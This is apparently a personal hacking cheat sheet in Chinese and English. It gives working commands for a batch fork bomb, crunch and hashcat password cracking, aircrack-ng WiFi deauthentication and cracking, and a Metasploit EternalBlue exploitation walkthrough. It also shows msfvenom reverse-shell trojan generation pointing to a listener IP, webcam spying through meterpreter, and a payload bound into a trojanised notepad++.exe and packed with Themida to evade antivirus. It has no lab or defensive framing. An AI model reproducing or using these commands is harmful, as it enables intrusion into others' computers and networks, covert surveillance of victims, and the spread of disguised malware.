# 死机脚本
bat
```
%0| %0|
```

# crunch 
```
crunch <min-len> <max-len> [<charset string>] [options]
crunch 密码最小长度 密码最大长度 [字符集] [命令选项] 

crunch 6 6 0123456789 -o start  

-b 1mb 按大小分割字典文件。
-c 100 按行数分割字典文件
-d 2 # 同意字符能够连贯出现的数量。比如11X11X

	crunch 6 6 0123456789 -d 2 # 生成6位数，由0到9位数字组成的，同一字符最多连续出现2次的字典。 

-f /usr/share/crunch/charset.lst lalpha-sv # 使用定义好的字符集

	crunch 4 4 -f /usr/share/crunch/charset.lst numeric -o 1.txt # 使用数字的字符集去生成4位数的字典。

-p 1234567890 
	无重复字符，注意-p必须是最后一个参数，最大最小字符失效但必须有，与-s、参数不兼容。
	crunch 1 1 -p abc # 生成abc的组合的字典 
	
-s 999 # 指定起始点(start)
	crunch 5 5 0123456789 -s 99990 # 生成的字典中是以99990为初始点的。 
	
-q 1.txt # 读取文件中每行内容作为基本字符，以排列组合的方式生成字典
	crunch 1 1 -q 1.txt # 以文件中每行内容作为基本字符，以排列组合的方式生成字典，最大最小字符失效但必须有 
```


#  hashcat使用方法
官网，下载编译好的版本
在cmd下用命令执行

ex：
hashcat -m 22000 28004_1684405214.hc22000 english.txt

warning 转换为支持的模式，官网提供工具，或者自己想办法转化
28004_1684405214.hc22000

![参考](http://www.xuji.pro/%E7%94%A8hashcat%E6%AF%8F%E7%A7%92%E8%AE%A1%E7%AE%971-4%E4%BA%BF%E4%B8%AA%E5%AF%86%E7%A0%81%EF%BC%8C%E7%A0%B4%E8%A7%A3%E9%9A%94%E5%A3%81wifi%E5%AF%86%E7%A0%81/)



# airmon-ng
airmon-ng start wlan0
ifconfig
airodump-ng wlan0mon
airodump-ng -w getter -c 2 --bssid  00:EF:34:DE:B2:12  wlan0mon -ignore-nefative-oneaa

//crack
aireplay-ng -0 2 -a  00:EF:34:DE:B2:12  -c DE:BD:54:B0:30:A9 wlan0mon
aircrack-ng -w /usr/share/wordlists/rockyou.txt (.ivs|.cap)

# msf
## the example of ms17010 :eternal blue
1. first use `msfconsole` to open msf
2. you choose an virus
we use `ms17_010` as an example ,you can get three kind of ms17010
```
 #Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
```
3. you can use
`
use 0 
or use xploit/windows/smb/ms17_010_eternalblue
`
to open this modular:模块
4. then you need configure this modular 
`show options`
you can see:
```
odule options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), see https://github.com/rapid7/metasp
                                             loit-framework/wiki/Using-Metasploit
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication.
                                              Only affects Windows Server 2008 R2, Windows 7, Windows
                                              Embedded Standard 7 target machines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Onl
                                             y affects Windows Server 2008 R2, Windows 7, Windows Emb
                                             edded Standard 7 target machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects
                                             Windows Server 2008 R2, Windows 7, Windows Embedded Stan
                                             dard 7 target machines.

Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.0.105    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target

```
the required that marked with yes is what you must configure
but most of them have a default value so you needn't configure it 

5. configure
`set RHOSTS 192.168.1.133`
or for a section 
`set RHOSTS 192.168.0.0-254`

6. run 
`run`

7. if the aim pc have loop hole 
you can get :
`meterpreter` as a new console
you get the windows cmd you want
you can use `help` in this console to get information
use the instruction in help you can control one's camera or mrcrophone


# msfvenom 远程木马 基础
msfconsole
use exploit/multi/handler
options

	查看设置
	or show options
set payload windows/x64/meterpreter/reverse_tcp
set lhost 8.134.64.48
set lport 444
run
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=8.134.64.48 lport=444 -f exe -o msf.exe

	ps: you can choose different options to diferent system::windows osx or android ,also diferent executable file::exe or apk
meterpreter

	means that you have controled target computer

## 例子：开启摄像头
webcam_list 查看是否有摄像头
webcam_stream 打开摄像头查看视频7


只能在内网环境下
1. 如果你要外网渗透的话，要反向代理或者是配置内网穿透
2. 或者用有外网ip的服务器



# 远程木马 绕过杀毒软件
## 捆绑
msfvenom -p windows/x64/meterpreter/reverse_top lhost=192.168.0.136 lport=9999 -f exe -x notepad++.exe -o notepad++2.exe

## themida
套壳 之后免火绒查杀

# seeker 苹果定位



